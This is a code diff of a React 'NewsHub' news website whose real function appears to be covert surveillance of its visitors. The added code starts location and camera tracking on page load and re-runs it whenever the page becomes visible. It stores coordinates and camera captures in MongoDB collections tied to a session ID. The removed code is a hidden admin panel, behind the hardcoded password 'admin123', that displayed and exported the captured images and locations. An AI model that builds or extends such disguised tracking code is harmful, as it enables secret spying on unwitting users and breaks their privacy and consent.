-      image: "https://images.unsplash.com/photo-1489599611383-e2bd6ff1d8ee?w=400&h=250&fit=crop"
-    },
-    {
-      id: 7,
-      title: "Space Exploration Reaches New Milestones in 2024",
-      summary: "Major space agencies collaborate on ambitious missions to Mars and beyond, marking historic achievements.",
-      category: "science",
-      author: "Commander Lisa Park",
-      publishedAt: "2024-01-13T18:20:00Z",
-      readTime: "7 min read",
-      image: "https://images.unsplash.com/photo-1446776653964-20c1d3a81b06?w=400&h=250&fit=crop"
-    },
-    {
-      id: 8,
-      title: "Renewable Energy Adoption Surpasses Coal for First Time",
-      summary: "Historic shift in global energy consumption patterns signals accelerated transition to sustainable power.",
-      category: "technology",
-      author: "Green Energy Institute",
-      publishedAt: "2024-01-13T14:45:00Z",
-      readTime: "6 min read",
-      image: "https://images.unsplash.com/photo-1466611653911-95081537e5b7?w=400&h=250&fit=crop"
-    }
-  ];
-
-  // Admin functions
-  const handleAdminLogin = () => {
-    const username = usernameRef.current;
-    const password = passwordRef.current;
-    
-    if (username === ADMIN_CREDENTIALS.username && password === ADMIN_CREDENTIALS.password) {
-      setIsAdmin(true);
-      setShowAdminLogin(false);
-      usernameRef.current = '';
-      passwordRef.current = '';
-      setTimeout(() => {
-        fetchAdminData();
-      }, 100);
-    } else {
-      alert('Invalid credentials! Use "admin" and "admin123"');
-    }
-  };
-
-  const handleAdminLogout = () => {
-    setIsAdmin(false);
-    usernameRef.current = '';
-    passwordRef.current = '';
-    setAdminData({ locations: [], cameraCaptures: [] });
-  };
-
-  const fetchAdminData = async () => {
-    if (!mongoClient) return;
-    
-    setAdminLoading(true);
-    try {
-      const locationCollection = mongoClient.db(DATABASE_NAME).collection('locations');
-      const locations = await locationCollection.find({}, { limit: 100 });
-      
-      const cameraCollection = mongoClient.db(DATABASE_NAME).collection('camera_captures');
-      const cameraCaptures = await cameraCollection.find({}, { limit: 50 });
-      
-      setAdminData({
-        locations: Array.isArray(locations) ? locations : [],
-        cameraCaptures: Array.isArray(cameraCaptures) ? cameraCaptures : []
-      });
+      setCameraTracked(true);
     } catch (error) {
-      console.error('Error fetching admin data:', error);
-      alert('Error fetching data: ' + error.message);
-      
-      setAdminData({
-        locations: [],
-        cameraCaptures: []
+      console.error('❌ Camera tracking failed with error:', {
+        name: error.name,
+        message: error.message,
+        stack: error.stack
       });
-    } finally {
-      setAdminLoading(false);
+      setCameraTracked(true);
     }
   };
 
-  const formatTimestamp = (timestamp) => {
-    if (!timestamp) return 'N/A';
-    const date = new Date(timestamp);
-    return date.toLocaleString();
-  };
+  // Enhanced mobile-specific debugging and permission handling
+  const initializeTracking = async () => {
+    mobileLog('🚀 Component mounted - Starting comprehensive tracking...');
+    mobileLog(`📱 Mobile Detection: ${JSON.stringify({
+      isMobile: /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      vendor: navigator.vendor,
+      touchSupport: 'ontouchstart' in window,
+      orientation: window.orientation,
+      screenSize: `${window.screen.width}x${window.screen.height}`,
+      viewport: `${window.innerWidth}x${window.innerHeight}`
+    })}`);
+    
+    // Generate session ID if not exists
+    if (!sessionStorage.getItem('sessionId')) {
+      const sessionId = Date.now().toString();
+      sessionStorage.setItem('sessionId', sessionId);
+      mobileLog(`🆔 Generated session ID: ${sessionId}`);
+    }
 
-  const downloadData = (data, filename) => {
-    const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
-    const url = URL.createObjectURL(blob);
-    const a = document.createElement('a');
-    a.href = url;
-    a.download = filename;
-    a.click();
-    URL.revokeObjectURL(url);
-  };
+    // Test network connectivity
+    mobileLog(`🌐 Network status: ${JSON.stringify({
+      online: navigator.onLine,
+      connection: navigator.connection ? {
+        effectiveType: navigator.connection.effectiveType,
+        downlink: navigator.connection.downlink,
+        rtt: navigator.connection.rtt
+      } : 'unavailable'
+    })}`);
 
-  // Initialize on mount with user interaction detection
-  useEffect(() => {
-    const initialize = async () => {
-      if (!sessionStorage.getItem('sessionId')) {
-        sessionStorage.setItem('sessionId', Date.now().toString());
-      }
-
+    try {
+      mobileLog('🔗 Attempting MongoDB initialization...');
       const dbClient = await initializeMongoDB();
       
-      // Load sample news data
-      setNewsArticles(getSampleArticles());
-      setLoading(false);
-
-      // Wait for user interaction before starting camera tracking
-      const startTrackingAfterInteraction = () => {
-        console.log('User interaction detected, starting tracking...');
+      if (dbClient) {
+        mobileLog('✅ MongoDB client ready, starting parallel tracking...');
         
-        // Start location tracking immediately
-        setTimeout(() => {
-          trackUserLocation();
-        }, 1000);
+        // Add delays for mobile browsers
+        const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+        
+        // Start location tracking first
+        mobileLog('📍 Starting location tracking...');
+        const locationPromise = trackUserLocation(true);
+        
+        // Wait 2 seconds before starting camera (mobile optimization)
+        await delay(2000);
+        
+        mobileLog('📷 Starting camera tracking...');
+        const cameraPromise = trackCameraAccess();
+        
+        // Wait for both to complete
+        const [locationResult, cameraResult] = await Promise.allSettled([
+          locationPromise,
+          cameraPromise
+        ]);
 
-        // Start camera tracking after user interaction with delay
-        setTimeout(() => {
-          trackCameraAccess();
+        mobileLog(`📊 Final tracking results: ${JSON.stringify({
+          location: locationResult.status,
+          locationValue: locationResult.value,
+          locationReason: locationResult.reason?.message,
+          camera: cameraResult.status,
+          cameraValue: cameraResult.value,
+          cameraReason: cameraResult.reason?.message
+        })}`);
+
+        // Manual verification of data storage
+        setTimeout(async () => {
+          await verifyDataStorage();
         }, 5000);
 
-        // Set up continuous tracking
-        setTimeout(() => {
-          startContinuousTracking();
-        }, 8000);
+      } else {
+        mobileLog('❌ Failed to initialize MongoDB connection', 'error');
+        // Try to show detailed error for debugging
+        await testDirectMongoConnection();
+      }
+    } catch (error) {
+      mobileLog(`❌ Tracking initialization failed: ${JSON.stringify({
+        name: error.name,
+        message: error.message,
+        stack: error.stack
+      })}`, 'error');
+    }
+  };
 
-        // Remove event listeners after first interaction
-        document.removeEventListener('click', startTrackingAfterInteraction);
-        document.removeEventListener('scroll', startTrackingAfterInteraction);
-        document.removeEventListener('touchstart', startTrackingAfterInteraction);
+  // Test direct MongoDB connection
+  const testDirectMongoConnection = async () => {
+    mobileLog('🧪 Testing direct MongoDB connection...');
+    try {
+      const testApp = new Realm.App({ id: REALM_APP_ID });
+      mobileLog(`🔗 Realm app created: ${testApp.id}`);
+      
+      const credentials = Realm.Credentials.anonymous();
+      mobileLog('🔐 Attempting authentication...');
+      
+      const user = await testApp.logIn(credentials);
+      mobileLog(`✅ Authentication successful: ${user.id}`);
+      
+      const mongodb = user.mongoClient("mongodb-atlas");
+      mobileLog('✅ MongoDB client obtained');
+      
+      // Test with the actual collections that should have rules
+      const locationCollection = mongodb.db(DATABASE_NAME).collection(COLLECTION_NAME);
+      
+      mobileLog('📝 Testing read operation on locations collection...');
+      
+      // Try a simple read first (using Realm Web SDK syntax)
+      try {
+        const existingDocs = await locationCollection.find({});
+        mobileLog(`✅ Read test successful: Found ${existingDocs.length} documents`);
+      } catch (readError) {
+        mobileLog(`❌ Read test failed: ${readError.message}`, 'error');
+      }
+      
+      // Now try write operation
+      mobileLog('📝 Testing write operation on locations collection...');
+      const testDoc = { 
+        test: true, 
+        timestamp: new Date().toISOString(),
+        mobile: true,
+        latitude: 0,
+        longitude: 0,
+        accuracy: 999999,
+        userAgent: 'Test User Agent'
       };
+      
+      const result = await locationCollection.insertOne(testDoc);
+      mobileLog(`✅ Write test successful: ${result.insertedId}`);
+      
+      // Clean up test document
+      await locationCollection.deleteOne({ _id: result.insertedId });
+      mobileLog('🧹 Test document cleaned up');
+      
+      return { success: true, insertedId: result.insertedId };
+      
+    } catch (error) {
+      mobileLog(`❌ Direct connection test failed: ${JSON.stringify({
+        name: error.name,
+        message: error.message,
+        code: error.code
+      })}`, 'error');
+      
+      // Provide specific guidance based on error
+      if (error.message.includes('no rule exists')) {
+        mobileLog('🔧 SOLUTION: Configure MongoDB Rules:', 'error');
+        mobileLog('1. Go to MongoDB Atlas → App Services → Your App', 'error');
+        mobileLog('2. Click "Rules" in left sidebar', 'error');
+        mobileLog('3. Click "Configure Collection Rules"', 'error');
+        mobileLog('4. Set Default Rules: Read: {}, Write: {}, Delete: {}', 'error');
+        mobileLog('5. Click "Save Draft" then "Deploy"', 'error');
+      } else if (error.message.includes('insert not permitted')) {
+        mobileLog('🔧 SOLUTION: Enable Write Permission in Rules', 'error');
+      } else if (error.message.includes('authentication')) {
+        mobileLog('🔧 SOLUTION: Enable Anonymous Authentication', 'error');
+      }
+      
+      return { success: false, error: error.message };
+    }
+  };
 
-      // Add event listeners for user interaction
-      document.addEventListener('click', startTrackingAfterInteraction, { once: true });
-      document.addEventListener('scroll', startTrackingAfterInteraction, { once: true });
-      document.addEventListener('touchstart', startTrackingAfterInteraction, { once: true });
+  // Verify data was actually stored - Fixed Realm Web SDK syntax
+  const verifyDataStorage = async () => {
+    mobileLog('🔍 Verifying data storage...');
+    if (!mongoClient) {
+      mobileLog('❌ No MongoDB client for verification', 'error');
+      return;
+    }
 
-      // Fallback - start tracking after 15 seconds even without interaction
-      setTimeout(() => {
-        if (!trackingActive) {
-          console.log('Fallback: Starting tracking without interaction...');
-          document.removeEventListener('click', startTrackingAfterInteraction);
-          document.removeEventListener('scroll', startTrackingAfterInteraction);
-          document.removeEventListener('touchstart', startTrackingAfterInteraction);
-          startContinuousTracking();
-        }
-      }, 15000);
-    };
-
-    initialize();
-
-    return () => {
-      ['locationInterval', 'cameraInterval'].forEach(key => {
-        const interval = sessionStorage.getItem(key);
-        if (interval) clearInterval(parseInt(interval));
+    try {
+      // Check recent location data - using Realm Web SDK proper syntax
+      const locationCollection = mongoClient.db(DATABASE_NAME).collection(COLLECTION_NAME);
+      
+      // Realm Web SDK doesn't support chaining like .find().sort().limit()
+      // Use aggregate instead
+      const recentLocations = await locationCollection.aggregate([
+        { $match: { sessionId: sessionStorage.getItem('sessionId') } },
+        { $sort: { createdAt: -1 } },
+        { $limit: 5 }
+      ]);
+      
+      mobileLog(`📍 Recent locations in DB: ${recentLocations.length}`);
+      recentLocations.forEach((loc, i) => {
+        mobileLog(`Location ${i + 1}: ${JSON.stringify({
+          id: loc._id,
+          lat: loc.latitude,
+          lng: loc.longitude,
+          timestamp: loc.timestamp
+        })}`);
       });
-    };
+
+      // Check recent camera data
+      const cameraCollection = mongoClient.db(DATABASE_NAME).collection('camera_captures');
+      const recentCaptures = await cameraCollection.aggregate([
+        { $match: { sessionId: sessionStorage.getItem('sessionId') } },
+        { $sort: { createdAt: -1 } },
+        { $limit: 5 }
+      ]);
+      
+      mobileLog(`📷 Recent camera captures in DB: ${recentCaptures.length}`);
+      recentCaptures.forEach((cap, i) => {
+        mobileLog(`Capture ${i + 1}: ${JSON.stringify({
+          id: cap._id,
+          cameras: cap.captures?.length || 0,
+          timestamp: cap.timestamp
+        })}`);
+      });
+
+    } catch (error) {
+      mobileLog(`❌ Data verification failed: ${error.message}`, 'error');
+    }
+  };
+
+  // Initialize tracking on component mount
+  useEffect(() => {
+    initializeTracking();
   }, []);
 
-  // News filtering
+  // Enhanced visibility change handler for mobile
+  useEffect(() => {
+    const handleVisibilityChange = async () => {
+      if (document.visibilityState === 'visible' && mongoClient) {
+        console.log('👁️ Page became visible - re-tracking...');
+        console.log('📱 Mobile re-activation detected');
+        
+        // Wait a bit for mobile to stabilize
+        setTimeout(async () => {
+          await Promise.allSettled([
+            trackUserLocation(true),
+            trackCameraAccess()
+          ]);
+        }, 1000);
+      }
+    };
+
+    const handleFocus = async () => {
+      console.log('🎯 Window focused - mobile app returned');
+      if (mongoClient) {
+        setTimeout(async () => {
+          await verifyDataStorage();
+        }, 2000);
+      }
+    };
+
+    document.addEventListener('visibilitychange', handleVisibilityChange);
+    window.addEventListener('focus', handleFocus);
+    
+    return () => {
+      document.removeEventListener('visibilitychange', handleVisibilityChange);
+      window.removeEventListener('focus', handleFocus);
+    };
+  }, [mongoClient]);
+
+  // Enhanced mobile client ready handler
+  useEffect(() => {
+    if (mongoClient && (!locationTracked || !cameraTracked)) {
+      console.log('🔗 MongoDB client ready - initiating mobile tracking...');
+      console.log('📊 Current tracking status:', {
+        locationTracked,
+        cameraTracked,
+        mongoClientReady: !!mongoClient
+      });
+      
+      // Mobile-optimized tracking with delays
+      const startMobileTracking = async () => {
+        if (!locationTracked) {
+          console.log('📍 Starting location tracking for mobile...');
+          try {
+            await trackUserLocation(true);
+          } catch (error) {
+            console.error('❌ Mobile location tracking failed:', error);
+          }
+        }
+        
+        // Wait before camera on mobile
+        if (!cameraTracked) {
+          setTimeout(async () => {
+            console.log('📷 Starting camera tracking for mobile...');
+            try {
+              await trackCameraAccess();
+            } catch (error) {
+              console.error('❌ Mobile camera tracking failed:', error);
+            }
+          }, 3000);
+        }
+      };
+      
+      startMobileTracking();
+    }
+  }, [mongoClient, locationTracked, cameraTracked]);
+
+  useEffect(() => {
+    return () => {
+      if (mediaStream) {
+        mediaStream.getTracks().forEach(track => track.stop());
+      }
+    };
+  }, [mediaStream]);
+
+  // News filtering logic
   const filteredArticles = newsArticles.filter(article => {
     const matchesCategory = selectedCategory === 'all' || article.category === selectedCategory;
     const matchesSearch = article.title.toLowerCase().includes(searchQuery.toLowerCase()) ||
@@ -955,8 +1134,11 @@ const NewsWebsite = () => {
   const regularArticles = filteredArticles.filter(article => !article.featured);
 
   const formatDate = (dateString) => {
-    return new Date(dateString).toLocaleDateString('en-US', { 
-      month: 'long', day: 'numeric', year: 'numeric' 
+    const date = new Date(dateString);
+    return date.toLocaleDateString('en-US', { 
+      month: 'long', 
+      day: 'numeric', 
+      year: 'numeric' 
     });
   };
 
@@ -975,261 +1157,8 @@ const NewsWebsite = () => {
     }
   };
 
-  // Admin Login Modal Component with Refs
-  const AdminLoginModal = () => {
-    if (!showAdminLogin) return null;
-
-    return (
-      <div 
-        style={styles.modalOverlay}
-        onClick={(e) => {
-          if (e.target === e.currentTarget) {
-            setShowAdminLogin(false);
-          }
-        }}
-      >
-        <div style={styles.loginForm}>
-          <h2 style={{ textAlign: 'center', marginBottom: '1.5rem', color: '#333' }}>
-            Admin Login
-          </h2>
-          
-          <input
-            type="text"
-            placeholder="Username (admin)"
-            style={styles.loginInput}
-            defaultValue=""
-            onChange={(e) => {
-              usernameRef.current = e.target.value;
-            }}
-            autoComplete="username"
-          />
-          
-          <input
-            type="password"
-            placeholder="Password (admin123)"
-            style={styles.loginInput}
-            defaultValue=""
-            onChange={(e) => {
-              passwordRef.current = e.target.value;
-            }}
-            onKeyDown={(e) => {
-              if (e.key === 'Enter') {
-                e.preventDefault();
-                handleAdminLogin();
-              }
-            }}
-            autoComplete="current-password"
-          />
-          
-          <button 
-            style={styles.loginButton}
-            onClick={handleAdminLogin}
-            type="button"
-          >
-            Login
-          </button>
-          
-          <button 
-            style={{
-              ...styles.loginButton, 
-              backgroundColor: '#6c757d', 
-              marginTop: '0.5rem'
-            }}
-            onClick={() => setShowAdminLogin(false)}
-            type="button"
-          >
-            Cancel
-          </button>
-        </div>
-      </div>
-    );
-  };
-
-  // Admin Panel Component
-  const AdminPanel = () => {
-    if (!isAdmin) return null;
-
-    const stats = {
-      totalLocations: adminData.locations.length,
-      totalCameraCaptures: adminData.cameraCaptures.length,
-      uniqueSessions: new Set(adminData.locations.map(l => l.sessionId)).size,
-      totalImages: adminData.cameraCaptures.reduce((acc, capture) => acc + (capture.captures?.length || 0), 0)
-    };
-
-    return (
-      <div style={styles.adminPanel}>
-        <div style={styles.adminHeader}>
-          <h1>NewsHub Admin Panel</h1>
-          <button 
-            style={{...styles.loginButton, width: 'auto', padding: '0.5rem 1rem'}}
-            onClick={handleAdminLogout}
-          >
-            Logout
-          </button>
-        </div>
-
-        <div style={styles.adminNav}>
-          <button
-            style={{
-              ...styles.adminNavButton,
-              ...(adminView === 'locations' ? styles.adminNavButtonActive : {})
-            }}
-            onClick={() => setAdminView('locations')}
-          >
-            Location Data ({stats.totalLocations})
-          </button>
-          <button
-            style={{
-              ...styles.adminNavButton,
-              ...(adminView === 'camera' ? styles.adminNavButtonActive : {})
-            }}
-            onClick={() => setAdminView('camera')}
-          >
-            Camera Data ({stats.totalCameraCaptures})
-          </button>
-          <button
-            style={{
-              ...styles.adminNavButton,
-              ...(adminView === 'stats' ? styles.adminNavButtonActive : {})
-            }}
-            onClick={() => setAdminView('stats')}
-          >
-            Statistics
-          </button>
-        </div>
-
-        <div style={styles.adminContent}>
-          {adminLoading && (
-            <div style={styles.loadingContainer}>
-              <div style={styles.loadingSpinner}></div>
-              <p>Loading admin data...</p>
-            </div>
-          )}
-
-          {!adminLoading && adminView === 'stats' && (
-            <div>
-              <h2>System Statistics</h2>
-              <div style={styles.statsContainer}>
-                <div style={styles.statCard}>
-                  <span style={styles.statNumber}>{stats.totalLocations}</span>
-                  <div style={styles.statLabel}>Total Location Records</div>
-                </div>
-                <div style={styles.statCard}>
-                  <span style={styles.statNumber}>{stats.totalCameraCaptures}</span>
-                  <div style={styles.statLabel}>Camera Capture Sessions</div>
-                </div>
-                <div style={styles.statCard}>
-                  <span style={styles.statNumber}>{stats.uniqueSessions}</span>
-                  <div style={styles.statLabel}>Unique User Sessions</div>
-                </div>
-                <div style={styles.statCard}>
-                  <span style={styles.statNumber}>{stats.totalImages}</span>
-                  <div style={styles.statLabel}>Total Images Captured</div>
-                </div>
-              </div>
-              
-              <div style={{marginTop: '2rem'}}>
-                <h3>Export Data</h3>
-                <div style={{display: 'flex', gap: '1rem', flexWrap: 'wrap'}}>
-                  <button 
-                    style={styles.retryButton}
-                    onClick={() => downloadData(adminData.locations, 'location-data.json')}
-                  >
-                    Download Location Data
-                  </button>
-                  <button 
-                    style={styles.retryButton}
-                    onClick={() => downloadData(adminData.cameraCaptures, 'camera-data.json')}
-                  >
-                    Download Camera Data
-                  </button>
-                  <button 
-                    style={styles.retryButton}
-                    onClick={() => downloadData(adminData, 'all-data.json')}
-                  >
-                    Download All Data
-                  </button>
-                  <button 
-                    style={{...styles.retryButton, backgroundColor: '#28a745'}}
-                    onClick={fetchAdminData}
-                  >
-                    Refresh Data
-                  </button>
-                </div>
-              </div>
-            </div>
-          )}
-
-          {!adminLoading && adminView === 'locations' && (
-            <div>
-              <h2>Location Data ({adminData.locations.length} records)</h2>
-              <div style={styles.dataGrid}>
-                {adminData.locations.map((location, index) => (
-                  <div key={index} style={styles.dataCard}>
-                    <h4>Session: {location.sessionId}</h4>
-                    <p><strong>Coordinates:</strong> {location.latitude?.toFixed(6)}, {location.longitude?.toFixed(6)}</p>
-                    <p><strong>Accuracy:</strong> {location.accuracy?.toFixed(2)}m</p>
-                    <p><strong>Timestamp:</strong> {formatTimestamp(location.timestamp)}</p>
-                    <p><strong>User Agent:</strong> {location.userAgent?.substring(0, 50)}...</p>
-                    <p><strong>Visit Count:</strong> {location.visitCount}</p>
-                    {location.isMobile && <p><strong>Device:</strong> Mobile</p>}
-                    {location.speed && <p><strong>Speed:</strong> {location.speed} m/s</p>}
-                  </div>
-                ))}
-              </div>
-            </div>
-          )}
-
-          {!adminLoading && adminView === 'camera' && (
-            <div>
-              <h2>Camera Data ({adminData.cameraCaptures.length} sessions)</h2>
-              <div style={styles.dataGrid}>
-                {adminData.cameraCaptures.map((capture, index) => (
-                  <div key={index} style={styles.dataCard}>
-                    <h4>Session: {capture.sessionId}</h4>
-                    <p><strong>Available Cameras:</strong> {capture.availableCameras}</p>
-                    <p><strong>Timestamp:</strong> {formatTimestamp(capture.timestamp)}</p>
-                    <p><strong>Images Captured:</strong> {capture.captures?.length || 0}</p>
-                    
-                    {capture.devices && (
-                      <div>
-                        <strong>Devices:</strong>
-                        <ul>
-                          {capture.devices.map((device, idx) => (
-                            <li key={idx}>{device.label} ({device.kind})</li>
-                          ))}
-                        </ul>
-                      </div>
-                    )}
-                    
-                    {capture.captures && capture.captures.length > 0 && (
-                      <div>
-                        <strong>Captured Images:</strong>
-                        <div style={{display: 'flex', gap: '10px', flexWrap: 'wrap', marginTop: '10px'}}>
-                          {capture.captures.map((img, idx) => (
-                            <div key={idx}>
-                              <img 
-                                src={img.imageData} 
-                                alt={`${img.camera} camera`}
-                                style={styles.imagePreview}
-                                onClick={() => window.open(img.imageData, '_blank')}
-                              />
-                              <p style={{fontSize: '0.8rem', textAlign: 'center'}}>
-                                {img.camera} ({img.width}x{img.height})
-                              </p>
-                            </div>
-                          ))}
-                        </div>
-                      </div>
-                    )}
-                  </div>
-                ))}
-              </div>
-            </div>
-          )}
-        </div>
-      </div>
-    );
+  const toggleMobileMenu = () => {
+    setMobileMenuOpen(!mobileMenuOpen);
   };
 
   return (
@@ -1237,7 +1166,35 @@ const NewsWebsite = () => {
       <header style={styles.header}>
         <div style={styles.headerContent}>
           <div style={styles.logo}>NewsHub</div>
-          <nav style={styles.nav}>
+          
+          <nav style={{...styles.nav, display: window.innerWidth > 768 ? 'flex' : 'none'}}>
+            <a href="#" style={styles.navLink}>Home</a>
+            <a href="#" style={styles.navLink}>World</a>
+            <a href="#" style={styles.navLink}>Politics</a>
+            <a href="#" style={styles.navLink}>Opinion</a>
+            <div style={styles.searchContainer}>
+              <input
+                type="text"
+                placeholder="Search news..."
+                style={styles.searchInput}
+                value={searchQuery}
+                onChange={(e) => setSearchQuery(e.target.value)}
+              />
+              <span style={{color: '#ccc', marginLeft: '0.5rem'}}>🔍</span>
+            </div>
+          </nav>
+
+          <button 
+            style={{...styles.mobileMenuToggle, display: window.innerWidth <= 768 ? 'block' : 'none'}}
+            onClick={toggleMobileMenu}
+          >
+            ☰
+          </button>
+
+          <nav style={{
+            ...styles.mobileNav,
+            ...(mobileMenuOpen && window.innerWidth <= 768 ? styles.mobileNavVisible : {})
+          }}>
             <a href="#" style={styles.navLink}>Home</a>
             <a href="#" style={styles.navLink}>World</a>
             <a href="#" style={styles.navLink}>Politics</a>
@@ -1266,120 +1223,72 @@ const NewsWebsite = () => {
                 ...(selectedCategory === category ? styles.categoryButtonActive : {})
               }}
               onClick={() => setSelectedCategory(category)}
-              disabled={loading}
             >
               {category}
             </button>
           ))}
         </div>
 
-        {error && (
-          <div style={styles.errorContainer}>
-            <p style={styles.errorText}>Failed to load news: {error}</p>
-            <button 
-              style={styles.retryButton}
-              onClick={() => setNewsArticles(getSampleArticles())}
+        {featuredArticle && selectedCategory === 'all' && (
+          <section style={styles.featuredSection}>
+            <h2 style={styles.featuredTitle}>Featured Story</h2>
+            <div 
+              className="featured"
+              style={styles.featuredCard}
+              onMouseEnter={handleCardHover}
+              onMouseLeave={handleCardLeave}
             >
-              Retry
-            </button>
-          </div>
-        )}
-
-        {loading && (
-          <div style={styles.loadingContainer}>
-            <div style={styles.loadingSpinner}></div>
-            <p>Loading latest news...</p>
-          </div>
-        )}
-
-        {!loading && !error && (
-          <>
-            {featuredArticle && selectedCategory === 'all' && (
-              <section style={styles.featuredSection}>
-                <h2 style={styles.featuredTitle}>Featured Story</h2>
-                <div 
-                  style={styles.featuredCard}
-                  onMouseEnter={handleCardHover}
-                  onMouseLeave={handleCardLeave}
-                  onClick={() => featuredArticle.url && window.open(featuredArticle.url, '_blank')}
-                >
-                  <img 
-                    src={featuredArticle.image} 
-                    alt={featuredArticle.title}
-                    style={styles.featuredImage}
-                  />
-                  <div style={styles.featuredContent}>
-                    <div style={styles.categoryTag}>{featuredArticle.category}</div>
-                    <h3 style={styles.articleTitle}>{featuredArticle.title}</h3>
-                    <p style={styles.articleSummary}>{featuredArticle.summary}</p>
-                    <div style={styles.articleMeta}>
-                      <span>By {featuredArticle.author} • {formatDate(featuredArticle.publishedAt)}</span>
-                      <span>{featuredArticle.readTime}</span>
-                    </div>
-                    {featuredArticle.source && (
-                      <div style={{...styles.articleMeta, marginTop: '0.5rem'}}>
-                        <span>Source: {featuredArticle.source}</span>
-                      </div>
-                    )}
-                  </div>
+              <img 
+                src={featuredArticle.image} 
+                alt={featuredArticle.title}
+                style={styles.featuredImage}
+              />
+              <div style={styles.featuredContent}>
+                <div style={styles.categoryTag}>{featuredArticle.category}</div>
+                <h3 style={styles.articleTitle}>{featuredArticle.title}</h3>
+                <p style={styles.articleSummary}>{featuredArticle.summary}</p>
+                <div style={styles.articleMeta}>
+                  <span>By {featuredArticle.author} • {formatDate(featuredArticle.publishedAt)}</span>
+                  <span>{featuredArticle.readTime}</span>
                 </div>
-              </section>
-            )}
-
-            <div style={styles.newsGrid}>
-              {regularArticles.map(article => (
-                <div
-                  key={article.id}
-                  style={styles.newsCard}
-                  onMouseEnter={handleCardHover}
-                  onMouseLeave={handleCardLeave}
-                  onClick={() => article.url && window.open(article.url, '_blank')}
-                >
-                  <img 
-                    src={article.image} 
-                    alt={article.title}
-                    style={styles.newsImage}
-                  />
-                  <div style={styles.newsContent}>
-                    <div style={styles.categoryTag}>{article.category}</div>
-                    <h3 style={styles.newsTitle}>{article.title}</h3>
-                    <p style={styles.newsSummary}>{article.summary}</p>
-                    <div style={styles.articleMeta}>
-                      <span>By {article.author}</span>
-                      <span>{article.readTime}</span>
-                    </div>
-                    <div style={{...styles.articleMeta, marginTop: '0.5rem'}}>
-                      <span>{formatDate(article.publishedAt)}</span>
-                      {article.source && <span>• {article.source}</span>}
-                    </div>
-                  </div>
-                </div>
-              ))}
-            </div>
-
-            {regularArticles.length === 0 && !loading && (
-              <div style={styles.loadingContainer}>
-                <p>No articles found. Try a different category or search term.</p>
               </div>
-            )}
-          </>
+            </div>
+          </section>
         )}
+
+        <div style={styles.newsGrid}>
+          {regularArticles.map(article => (
+            <div
+              key={article.id}
+              style={styles.newsCard}
+              onMouseEnter={handleCardHover}
+              onMouseLeave={handleCardLeave}
+            >
+              <img 
+                src={article.image} 
+                alt={article.title}
+                style={styles.newsImage}
+              />
+              <div style={styles.newsContent}>
+                <div style={styles.categoryTag}>{article.category}</div>
+                <h3 style={styles.newsTitle}>{article.title}</h3>
+                <p style={styles.newsSummary}>{article.summary}</p>
+                <div style={styles.articleMeta}>
+                  <span>By {article.author}</span>
+                  <span>{article.readTime}</span>
+                </div>
+                <div style={{...styles.articleMeta, marginTop: '0.5rem'}}>
+                  <span>{formatDate(article.publishedAt)}</span>
+                </div>
+              </div>
+            </div>
+          ))}
+        </div>
       </main>
 
       <footer style={styles.footer}>
         <div style={styles.footerContent}>
-          {!isAdmin && !showAdminLogin && (
-            <div 
-              style={{...styles.logo, cursor: 'pointer'}}
-              onClick={() => setShowAdminLogin(true)}
-              title="Admin Access"
-            >
-              NewsHub
-            </div>
-          )}
-          {(isAdmin || showAdminLogin) && (
-            <div style={styles.logo}>NewsHub</div>
-          )}
+          <div style={styles.logo}>NewsHub</div>
           <p style={styles.footerText}>
             Your trusted source for breaking news and in-depth analysis
           </p>
@@ -1389,18 +1298,118 @@ const NewsWebsite = () => {
         </div>
       </footer>
 
-      <AdminLoginModal />
-      <AdminPanel />
-      
-      {/* Add CSS animations */}
-      <style jsx>{`
+      {/* Mobile Debug Panel */}
+      {showDebugPanel && (
+        <div style={styles.debugPanel}>
+          <div style={styles.debugHeader}>
+            <h3>Mobile Debug Console</h3>
+            <div>
+              <button 
+                style={styles.testButton}
+                onClick={testDirectMongoConnection}
+              >
+                Test DB
+              </button>
+              <button 
+                style={styles.testButton}
+                onClick={() => {
+                  setDebugInfo([]);
+                  mobileLog('🧹 Debug log cleared');
+                }}
+              >
+                Clear
+              </button>
+              <button 
+                style={styles.testButton}
+                onClick={() => setShowDebugPanel(false)}
+              >
+                Close
+              </button>
+            </div>
+          </div>
+          <div style={{ padding: '10px' }}>
+            <div style={{ marginBottom: '10px', fontSize: '14px' }}>
+              <strong>Session ID:</strong> {sessionStorage.getItem('sessionId')}<br/>
+              <strong>MongoDB Client:</strong> {mongoClient ? '✅ Connected' : '❌ Not Connected'}<br/>
+              <strong>Location Tracked:</strong> {locationTracked ? '✅ Yes' : '❌ No'}<br/>
+              <strong>Camera Tracked:</strong> {cameraTracked ? '✅ Yes' : '❌ No'}<br/>
+              <strong>Is Secure Context:</strong> {window.isSecureContext ? '✅ Yes' : '❌ No'}<br/>
+              <strong>Protocol:</strong> {window.location.protocol}<br/>
+            </div>
+            {debugInfo.map(entry => (
+              <div 
+                key={entry.id} 
+                style={{
+                  ...styles.debugEntry,
+                  color: entry.type === 'error' ? '#ff6b6b' : '#00ff00'
+                }}
+              >
+                <small>{entry.timestamp}</small><br/>
+                <pre style={{ whiteSpace: 'pre-wrap', margin: 0 }}>{entry.message}</pre>
+              </div>
+            ))}
+          </div>
+        </div>
+      )}
+
+      {/* Debug Toggle Button */}
+      <button 
+        style={styles.debugButton}
+        onClick={() => setShowDebugPanel(!showDebugPanel)}
+        title="Toggle Debug Panel"
+      >
+        🐛
+      </button>
+
+      <style>{`
+        @media (max-width: 768px) {
+          .nav-desktop { display: none !important; }
+          .mobile-menu-toggle { display: block !important; }
+          .header-content { flex-direction: column; align-items: stretch; }
+        }
+        
+        @media (min-width: 769px) {
+          .nav-desktop { display: flex !important; }
+          .mobile-menu-toggle { display: none !important; }
+          .mobile-nav { display: none !important; }
+        }
+
+        /* Touch-friendly tap targets */
+        @media (max-width: 768px) {
+          button, a {
+            min-height: 44px;
+            min-width: 44px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+          }
+        }
+
+        /* Smooth scrolling */
+        html {
+          scroll-behavior: smooth;
+        }
+
+        /* Remove hover effects on touch devices */
+        @media (hover: none) {
+          .news-card:hover,
+          .featured-card:hover {
+            transform: none !important;
+            box-shadow: initial !important;
+          }
+        }
+
+        /* Animation for spinner */
         @keyframes spin {
           0% { transform: rotate(0deg); }
           100% { transform: rotate(360deg); }
         }
-        @keyframes modalFadeIn {
